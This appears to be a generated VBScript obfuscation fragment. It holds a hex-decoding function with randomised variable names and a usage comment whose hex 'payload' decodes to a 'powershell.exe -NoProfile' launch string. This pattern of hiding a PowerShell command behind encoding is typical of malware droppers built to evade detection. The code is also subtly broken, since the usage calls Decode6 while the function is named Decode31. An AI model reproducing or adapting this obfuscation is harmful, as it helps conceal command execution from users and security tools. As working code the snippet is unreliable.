Function Decode31(h29_phFrGds)
    Dim r30_XtglCz, i31_tFqapzmOsC
    r30_XtglCz = ""
    For i31_tFqapzmOsC = 1 To Len(h29_phFrGds) Step 2
        r30_XtglCz = r30_XtglCz & Chr(CLng("&H" & Mid(h29_phFrGds, i31_tFqapzmOsC, 2)))
    Next
    Decode31 = r30_XtglCz
End Function

'' Complete script usage:
'' Dim hexPayload
'' hexPayload = "706f7765727368656c6c2e657865202d4e6f50726f66696c65"
'' Dim result
'' result = Decode6(hexPayload)
'' WScript.Echo result
